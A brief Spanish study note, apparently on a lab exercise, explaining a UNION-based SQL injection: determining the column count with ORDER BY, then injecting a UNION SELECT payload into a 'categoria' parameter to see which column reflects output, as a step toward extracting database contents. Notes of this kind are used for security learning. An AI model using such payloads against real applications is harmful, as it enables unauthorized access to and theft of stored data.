- Tags : #sql #sqlinjection #sql_union_attack

Para esto solo necesitamos devolver algo mediante union select
primero determinamos la cantidad de columnas que devuelve la consulta con order by apoyarnos en ejemplo anteriores y luego hacer la union select
```sql
categoria='union select NULL,NULL,'prueba' --

Devuelve prueba el la 3 columna ver los ejemplos de extraccion de datos donde podemos acceder a informacion de las BD
```